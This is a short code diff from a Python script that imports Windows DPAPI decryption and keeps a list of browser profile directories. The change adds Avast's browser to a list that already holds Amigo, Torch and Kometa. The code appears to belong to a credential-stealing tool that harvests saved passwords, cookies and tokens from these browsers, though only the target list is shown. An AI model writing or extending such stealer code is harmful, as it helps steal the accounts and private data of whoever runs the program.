@@ -11,6 +11,7 @@ from win32crypt import CryptUnprotectData
 appdata = os.getenv('LOCALAPPDATA')
 
 browsers = {
+    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
     'amigo': appdata + '\\Amigo\\User Data',
     'torch': appdata + '\\Torch\\User Data',
     'kometa': appdata + '\\Kometa\\User Data',
